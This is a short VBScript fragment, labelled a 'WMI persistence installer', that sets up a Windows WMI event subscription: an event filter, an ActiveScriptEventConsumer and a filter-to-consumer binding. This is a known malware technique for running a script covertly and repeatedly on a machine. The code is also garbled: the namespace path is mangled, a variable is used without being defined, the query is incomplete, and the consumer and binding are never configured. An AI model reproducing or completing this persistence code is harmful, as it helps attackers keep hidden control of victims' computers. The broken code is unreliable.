' WMI persistence installer
Set objWMI = GetObject("winmgmts:\\.\oot\subscription")
Set objFilter = objWMI.Get("__EventFilter")
filterInstance.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60"
Set objConsumer = objWMI.Get("ActiveScriptEventConsumer")
Set objBinding = objWMI.Get("__FilterToConsumerBinding")
